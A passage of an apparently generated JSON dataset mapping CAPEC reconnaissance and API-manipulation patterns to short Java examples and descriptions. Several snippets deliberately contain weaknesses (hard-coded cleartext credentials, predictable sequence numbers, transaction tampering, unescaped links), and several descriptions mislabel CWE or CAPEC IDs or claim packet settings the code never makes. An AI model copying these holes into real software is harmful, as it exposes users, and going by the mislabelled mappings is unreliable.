        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class ICMPSpoofing {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        try {\n            InetAddress target = InetAddress.getByName(targetIP);\n            if (target.isReachable(5000)) {\n                System.out.println(\"Target is reachable\");\n            } else {\n                System.out.println(\"Target is not reachable\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + targetIP);\n        } catch (IOException e) {\n            System.out.println(\"Network error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic ICMP probe to check if a target IP address is reachable. The code uses the `InetAddress` class to send an ICMP echo request (ping) to the specified IP address. If the target responds within the timeout period, it prints 'Target is reachable'; otherwise, it prints 'Target is not reachable'. This embodies the main idea of CAPEC-312: Active OS Fingerprinting, as ICMP probes are often used in network reconnaissance to gather information about the target system's operating system and network configuration. The code also touches on CWE-287 (Authentication Bypass Issues) by not implementing any authentication mechanism, CWE-532 (Information Exposure Through Debug Log Files) by potentially exposing network error messages, and CWE-350 (Reliance on DNS Lookups in a Security Decision) by relying on DNS resolution for the target IP address."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Random;\n\npublic class IPIDSequencingProbe {\n    public static void main(String[] args) throws Exception {\n        InetAddress target = InetAddress.getByName(\"192.168.1.1\");\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        Random random = new Random();\n\n        for (int i = 0; i < 10; i++) {\n            int id = random.nextInt(65535);\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, target, 33434);\n            socket.send(packet);\n            System.out.println(\"Sent packet with ID: \" + id);\n            Thread.sleep(1000);\n        }\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple IP ID sequencing probe. It sends multiple UDP packets to a target IP address, each with a randomly generated ID. The code uses a DatagramSocket to send packets and prints the ID of each sent packet. This simulates the process of analyzing the IP 'ID' field sequence number generation algorithm of a remote host, which can be used for OS fingerprinting. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing the target's IP ID sequence generation pattern, and CWE-291 (Reliance on IP Address for Authentication) by assuming the target's IP address is sufficient for probing without additional authentication."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class IPIDProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1]; // Minimal payload\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\"); // Target IP\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 12345); // Closed port\n            \n            // Set an arbitrary IP ID value (e.g., 12345)\n            socket.send(packet);\n            \n            // Wait for ICMP error message (not implemented for simplicity)\n            // In a real scenario, you would capture the ICMP response and analyze the IP ID field\n            \n            socket.close();\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an IP 'ID' Echoed Byte-Order Probe, which is used for OS fingerprinting. The code sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a remote host. The main idea is to observe how the IP 'ID' value is echoed back in the ICMP error message, which can reveal information about the remote host's operating system. This technique can expose sensitive information (CWE-200) and is related to improper handling of identifiers (CWE-1192, CWE-1290, CWE-1302, CWE-1323) in the context of System-on-Chip (SoC) security."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class IPFragmentationProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(2000);\n\n            byte[] buffer = new byte[1]; // Minimal payload\n            InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\"); // Target IP\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 12345); // Closed port\n\n            // Set the DF (Don't Fragment) bit\n            socket.send(packet);\n\n            // Wait for a response\n            DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n            socket.receive(response);\n\n            // Check if the DF bit is echoed back\n            boolean dfBitEchoed = (response.getData()[6] & 0x40) != 0;\n            System.out.println(\"DF bit echoed: \" + dfBitEchoed);\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n        } catch (Exception e) {\n            System.out.println(\"No response received or other error.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates an IP fragmentation probe that tests if a remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. The code sends a UDP datagram with the DF bit set to a closed port on the target host. It then waits for an ICMP error message in response and checks if the DF bit is echoed back. This behavior can be used for OS fingerprinting, as different operating systems handle the DF bit differently. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200) and incorrectly specified destinations in communication channels (CWE-941)."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class TcpTimestampServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(new ClientHandler(socket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            InputStream input = socket.getInputStream();\n            OutputStream output = socket.getOutputStream();\n\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n\n            // Simulate TCP timestamp response\n            long timestamp = System.currentTimeMillis();\n            String response = \"Timestamp: \" + timestamp + \"\\n\";\n            output.write(response.getBytes());\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple TCP server that listens on port 8080 and responds to incoming connections with a simulated TCP timestamp. The server accepts connections and spawns a new thread for each client. The ClientHandler class reads data from the client, generates a timestamp using the current system time, and sends it back to the client. This demonstrates the concept of TCP Timestamp Probe (CAPEC-200) by exposing the system's timestamp information, which can be used by an attacker to infer the operating system. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by exposing timestamp information, CWE-208 (Observable Timing Discrepancy) by potentially revealing timing information, and CWE-319 (Cleartext Transmission of Sensitive Information) by sending the timestamp in cleartext."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class TCPSequenceNumberProbe {\n    private static final int PORT = 8080;\n    private static final Random random = new Random();\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                int ackNumber = clientSocket.getInputStream().read();\n                int sequenceNumber = generateSequenceNumber(ackNumber);\n                System.out.println(\"Generated Sequence Number: \" + sequenceNumber);\n                // Simulate sending a response with the sequence number\n                clientSocket.getOutputStream().write(sequenceNumber);\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static int generateSequenceNumber(int ackNumber) {\n        // Vulnerable predictable sequence number generation\n        return ackNumber + 1; // CWE-337: Predictable Seed in PRNG\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified TCP server that generates TCP sequence numbers based on the acknowledgment number received from a client. The server listens on port 8080 and accepts incoming connections. For each connection, it reads an acknowledgment number from the client, generates a sequence number by adding one to the acknowledgment number (CWE-337: Predictable Seed in PRNG), and sends the sequence number back to the client. This predictable sequence number generation can be exploited for OS fingerprinting, as described in the CAPEC. The code also implicitly touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sequence number generation patterns to unauthorized actors."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.util.Random;\n\npublic class ISNProbe {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java ISNProbe <target_ip>\");\n            return;\n        }\n\n        String targetIp = args[0];\n        int port = 80; // Common open port\n        int numProbes = 5;\n\n        try {\n            InetAddress target = InetAddress.getByName(targetIp);\n            for (int i = 0; i < numProbes; i++) {\n                try (Socket socket = new Socket(target, port)) {\n                    int isn = new Random().nextInt(); // Simulate ISN\n                    System.out.println(\"Probe \" + (i + 1) + \" ISN: \" + isn);\n                } catch (IOException e) {\n                    System.out.println(\"Failed to connect to target: \" + e.getMessage());\n                }\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + targetIp);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Initial Sequence Number (ISN) probe, which is used for OS fingerprinting. The program sends a number of TCP SYN packets to an open port (port 80 in this case) of a remote machine specified by the user. For each connection attempt, it simulates the generation of an ISN and prints it out. This process mimics the analysis of ISNs to determine the smallest increment value used by the target host, which can help identify the operating system. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200, CWE-497) and cleartext transmission (CWE-319) by not securing the communication channel or the ISN values."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.IOException;\n\npublic class TCPISNProbe {\n    private static final int PORT = 12345;\n    private static long lastISN = 0;\n    private static long lastTime = System.currentTimeMillis();\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                long currentTime = System.currentTimeMillis();\n                long currentISN = clientSocket.getLocalPort(); // Simulating ISN with local port for demonstration\n                long timeDiff = currentTime - lastTime;\n                long isnDiff = currentISN - lastISN;\n\n                System.out.println(\"Time Difference: \" + timeDiff + \" ms\");\n                System.out.println(\"ISN Difference: \" + isnDiff);\n\n                lastISN = currentISN;\n                lastTime = currentTime;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Initial Sequence Number (ISN) counter rate probe. The code sets up a server socket that listens for incoming connections. For each connection, it calculates the difference in time and the difference in the simulated ISN (using the local port for demonstration purposes) between the current and the last connection. This information can be used to infer the rate of ISN increments, which can then be compared against a database to identify the operating system. This example embodies the CAPEC concept by showing how timing analysis can be used to gather sensitive information (CWE-200) and demonstrates potential race conditions (CWE-367, CWE-362) in handling shared resources without proper synchronization."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import java.util.Random;\n\npublic class PredictableISN {\n    private static final int SEED = (int) (System.currentTimeMillis() % Integer.MAX_VALUE);\n    private Random random;\n\n    public PredictableISN() {\n        this.random = new Random(SEED);\n    }\n\n    public int generateISN() {\n        return random.nextInt();\n    }\n\n    public static void main(String[] args) {\n        PredictableISN isnGenerator = new PredictableISN();\n        System.out.println(\"Generated ISN: \" + isnGenerator.generateISN());\n    }\n}",
        "description": "This Java code snippet demonstrates a predictable Initial Sequence Number (ISN) generator, which embodies the main idea of the CAPEC 'TCP (ISN) Sequence Predictability Probe'. The code initializes a pseudo-random number generator (PRNG) with a predictable seed based on the current system time. This makes the generated sequence numbers predictable, which is a vulnerability described by CWE-337 ('Predictable Seed in Pseudo-Random Number Generator (PRNG)'). The `generateISN` method generates an ISN using this PRNG. An attacker could potentially predict the sequence numbers by observing the system time, leading to vulnerabilities such as session hijacking. This example also touches on CWE-341 ('Predictable from Observable State') since the seed is derived from the system time, an observable state."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ECNProbe {\n    public static void main(String[] args) throws IOException {\n        String targetIP = \"192.168.1.1\";\n        int port = 80;\n        byte[] ecnProbe = new byte[20]; // ECN probe packet\n        ecnProbe[13] = 0x03; // Set ECN flags\n\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(targetIP);\n        DatagramPacket packet = new DatagramPacket(ecnProbe, ecnProbe.length, address, port);\n\n        // Send ECN probe\n        socket.send(packet);\n\n        // Receive response\n        byte[] buffer = new byte[1024];\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n\n        // Print response\n        System.out.println(\"Response: \" + new String(response.getData()));\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple implementation of an ECN (Explicit Congestion Notification) probe to check if a remote host supports ECN messaging. The code constructs a UDP packet with ECN flags set and sends it to a specified target IP and port. It then waits for a response and prints it out. This code embodies the main idea of the CAPEC by probing the target system's support for ECN, which can reveal information about the system's configuration and behavior. The related CWEs are represented in the context of potential vulnerabilities such as exposure of sensitive information (CWE-200), improper protection for outbound error messages (CWE-1320), and cleartext transmission of sensitive information (CWE-319)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\n\npublic class TCPWindowSizeProbe {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                InputStream inputStream = clientSocket.getInputStream();\n                byte[] buffer = new byte[1024];\n                int bytesRead = inputStream.read(buffer);\n\n                // Vulnerable code: Exposing initial TCP window size\n                if (bytesRead > 0) {\n                    int initialWindowSize = clientSocket.getReceiveBufferSize();\n                    System.out.println(\"Initial TCP Window Size: \" + initialWindowSize);\n                }\n\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP server that listens for incoming connections on port 8080. When a client connects, the server reads data from the client and prints the initial TCP window size of the connection. This exposes sensitive information (initial TCP window size) to an unauthorized actor, which can be used for OS fingerprinting. The code also highlights potential vulnerabilities such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by printing sensitive information, and CWE-188 (Reliance on Data/Memory Layout) by assuming the buffer size and data layout."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic class TcpOptionsProbe {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                byte[] tcpOptions = getTcpOptions(clientSocket);\n                System.out.println(\"TCP Options: \" + Arrays.toString(tcpOptions));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte[] getTcpOptions(Socket socket) throws IOException {\n        // This is a placeholder for actual TCP options extraction logic\n        // In a real scenario, this would involve parsing the TCP header\n        byte[] options = new byte[20]; // Dummy data representing TCP options\n        Arrays.fill(options, (byte) 1); // Fill with dummy data\n        return options;\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP server that listens on port 8080 and accepts incoming connections. For each connection, it attempts to extract and print the TCP options from the client's TCP header. The `getTcpOptions` method is a placeholder and does not perform actual TCP header parsing; instead, it returns dummy data. This code embodies the main idea of the CAPEC 'TCP Options Probe' by illustrating how an attacker might analyze TCP options to fingerprint an operating system. The related CWEs are represented as follows:\n- CWE-200 (Exposure of Sensitive Information): The code prints TCP options, potentially exposing sensitive information about the client's OS.\n- CWE-188 (Reliance on Data/Memory Layout): The code assumes a specific structure for TCP options, which may not be valid across different implementations.\n- CWE-605 (Multiple Binds to the Same Port): Although not directly shown, allowing multiple binds could lead to service hijacking.\n- CWE-1313 and CWE-1316 are more hardware-specific and not directly applicable to this Java code snippet."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.OutputStream;\n\npublic class VulnerableTCPServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try (OutputStream out = clientSocket.getOutputStream()) {\n            // Simulate a connection error and send a RST packet with a human-readable message\n            String errorMessage = \"Connection reset by server due to error\";\n            byte[] rstPacket = createRSTPacket(errorMessage);\n            out.write(rstPacket);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte[] createRSTPacket(String message) {\n        // Create a simple RST packet with a human-readable message\n        // Note: This is a simplified example and not a real RST packet\n        return message.getBytes();\n    }\n}",
        "description": "This Java code snippet represents a vulnerable TCP server that simulates a connection error and sends a reset (RST) packet with a human-readable message. The server listens for incoming connections on port 8080. When a client connects, the server handles the client by sending a RST packet containing an error message in cleartext. This embodies the main idea of the CAPEC 'TCP RST Flag Checksum Probe' by exposing sensitive information (the error message) in a reset packet, which can be sniffed by unauthorized actors. The code also highlights related CWEs such as the exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and missing integrity checks (CWE-353, CWE-354)."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPErrorMessageProbe {\n    public static void main(String[] args) {\n        try {\n            // Target IP address\n            String target = \"192.168.1.1\";\n            InetAddress targetAddress = InetAddress.getByName(target);\n\n            // Create a raw socket\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(5000);\n\n            // Send a UDP packet to a closed port to generate an ICMP error\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 9999);\n            socket.send(packet);\n\n            // Receive the ICMP error message\n            DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n            socket.receive(response);\n\n            // Print the received data (potentially sensitive information)\n            System.out.println(\"Received ICMP error message: \" + new String(response.getData()));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an ICMP Error Message Quoting Probe. The code sends a UDP packet to a closed port on a target machine, which triggers an ICMP error message (e.g., Port Unreachable). The code then captures and prints the ICMP error message, which may contain quoted data from the original request. This can expose sensitive information, aligning with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-211 (Externally-Generated Error Message Containing Sensitive Information). The code highlights the risk of generating and handling error messages that may inadvertently leak sensitive information."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPErrorProbe {\n    public static void main(String[] args) throws IOException {\n        String target = \"192.168.1.1\";\n        byte[] buffer = new byte[1024];\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(target);\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 80);\n\n        // Send a packet to the target\n        socket.send(packet);\n\n        // Wait for an ICMP error message\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n\n        // Print the received data (potentially sensitive information)\n        String receivedData = new String(response.getData(), 0, response.getLength());\n        System.out.println(\"Received ICMP Error Message: \" + receivedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an ICMP Error Message Echoing Integrity Probe. The code sends a UDP packet to a target IP address and waits for an ICMP error message in response. When an ICMP error message is received, the code prints the data contained in the message. This data may include sensitive information from the original request, which can be analyzed by an adversary. The code embodies the main idea of CAPEC-ICMP Error Message Echoing Integrity Probe and highlights related CWEs such as exposure of sensitive information (CWE-200, CWE-211) and missing support for integrity checks (CWE-353)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class ICMPTotalLengthProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n            byte[] buffer = new byte[10]; // Small buffer to simulate UDP packet\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 12345); // Closed port\n            socket.send(packet);\n\n            byte[] recvBuffer = new byte[1024];\n            DatagramPacket response = new DatagramPacket(recvBuffer, recvBuffer.length);\n            socket.receive(response);\n\n            // Extract IP Total Length field from the ICMP Port Unreachable message\n            int ipTotalLength = ((recvBuffer[2] & 0xFF) << 8) | (recvBuffer[3] & 0xFF);\n            System.out.println(\"IP Total Length: \" + ipTotalLength);\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n        } catch (Exception e) {\n            System.out.println(\"Error receiving response\");\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an 'ICMP IP Total Length Field Probe' attack. The code sends a UDP packet to a closed port on a target machine, which triggers an ICMP 'Port Unreachable' error message. The code then captures this error message and extracts the IP Total Length field from the IP header of the ICMP message. This field can be used to infer information about the target's operating system. The code also highlights several related weaknesses: it does not verify the integrity of the received message (CWE-353, CWE-924), it handles length fields without validation (CWE-130), and it transmits data in cleartext (CWE-319)."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class IcmpProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n            int targetPort = 12345; // Closed port\n\n            // Create a UDP packet with a specific ID in the payload\n            buffer[0] = 0x12; // Example ID\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);\n            socket.send(packet);\n\n            // Wait for ICMP error message\n            DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n            socket.receive(response);\n\n            // Process the ICMP error message\n            byte[] responseData = response.getData();\n            System.out.println(\"Received ICMP error message with ID: \" + responseData[0]);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an ICMP IP 'ID' Field Error Message Probe. The code sends a UDP datagram with a specific ID to a closed port on a target machine. When the target machine responds with an ICMP error message, the code captures and processes this message to observe how the ID field is echoed back. This behavior can be used to fingerprint the operating system of the target machine. The code also touches on related CWEs by potentially revealing internal state information (CWE-204) and handling externally-generated error messages that may contain sensitive information (CWE-211)."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class EventMonitor {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Event hosted on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            String userId;\n            while ((userId = in.readLine()) != null) {\n                System.out.println(\"User ID: \" + userId); // CWE-311, CWE-319\n                // Simulate storing user IDs for spamming\n                storeUserId(userId);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void storeUserId(String userId) {\n        // Insecure storage of sensitive information\n        try (FileWriter fw = new FileWriter(\"user_ids.txt\", true);\n             BufferedWriter bw = new BufferedWriter(fw);\n             PrintWriter out = new PrintWriter(bw)) {\n            out.println(userId); // CWE-311\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable event monitoring system where an adversary hosts an event on port 8080 and captures user IDs of participants. The captured user IDs are then stored insecurely in a file. The code embodies the main idea of CAPEC-94 by showing how an attacker can harvest information via API event monitoring. The vulnerabilities include missing encryption of sensitive data (CWE-311), cleartext transmission of sensitive information (CWE-319), and insecure storage of sensitive information. This example highlights the risks of not properly securing sensitive data during transmission and storage."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableAPIClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-311: Missing Encryption of Sensitive Data\n            String sensitiveData = \"username=admin&password=admin123\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(sensitiveData);\n            writer.flush();\n            writer.close();\n\n            // Read response\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            StringBuilder response = new StringBuilder();\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            // CWE-345: Insufficient Verification of Data Authenticity\n            // CWE-346: Origin Validation Error\n            System.out.println(\"Response: \" + response.toString());\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable API client that sends sensitive data (username and password) to a server without encryption (CWE-311). The client does not verify the authenticity or origin of the data received from the server (CWE-345 and CWE-346). This setup can be exploited by an attacker performing an Application API Message Manipulation via Man-in-the-Middle attack (CAPEC-94). The attacker can intercept and manipulate the data being transmitted between the client and the server, potentially gaining unauthorized access or injecting malicious content."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TransactionTampering {\n    public static void main(String[] args) throws Exception {\n        String originalData = \"amount=100&currency=USD\";\n        String tamperedData = tamperData(originalData);\n        sendTamperedData(tamperedData);\n    }\n\n    private static String tamperData(String data) {\n        // CWE-471: Modification of Assumed-Immutable Data\n        return data.replace(\"100\", \"1000\");\n    }\n\n    private static void sendTamperedData(String data) throws IOException {\n        URL url = new URL(\"http://example.com/transaction\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setDoOutput(true);\n        conn.setRequestMethod(\"POST\");\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n        // CWE-311: Missing Encryption of Sensitive Data\n        try (OutputStream os = conn.getOutputStream()) {\n            os.write(data.getBytes());\n            os.flush();\n        }\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {\n            throw new RuntimeException(\"Failed : HTTP error code : \" + conn.getResponseCode());\n        }\n\n        // Read the response\n        try (BufferedReader br = new BufferedReader(new InputStreamReader((conn.getInputStream())))) {\n            String output;\n            while ((output = br.readLine()) != null) {\n                System.out.println(output);\n            }\n        }\n        conn.disconnect();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a transaction tampering attack. The main idea is to modify the data being sent in a transaction, which is a form of 'Transaction or Event Tampering via Application API Manipulation' (CAPEC). The code includes the following vulnerabilities:\n\n1. CWE-471: Modification of Assumed-Immutable Data - The `tamperData` method changes the transaction amount from 100 to 1000.\n2. CWE-311: Missing Encryption of Sensitive Data - The data is sent over HTTP without encryption.\n3. CWE-345: Insufficient Verification of Data Authenticity - The response code is checked, but there is no verification of the data's authenticity.\n\nThe code represents how an attacker might intercept and modify transaction data to manipulate the outcome of a transaction, exploiting the mentioned weaknesses."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/profile\")\npublic class ProfileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        String profileImageUrl = getProfileImageUrl(userId);\n        String profileLink = \"<a href='\" + profileImageUrl + \"'>View Profile</a>\";\n        response.getWriter().write(profileLink);\n    }\n\n    private String getProfileImageUrl(String userId) {\n        // Simulate fetching a profile image URL from a database\n        // Insecure: No validation of the URL, allowing potential navigation remapping\n        return \"http://example.com/profiles/\" + userId + \"/image.jpg\";\n    }\n}",
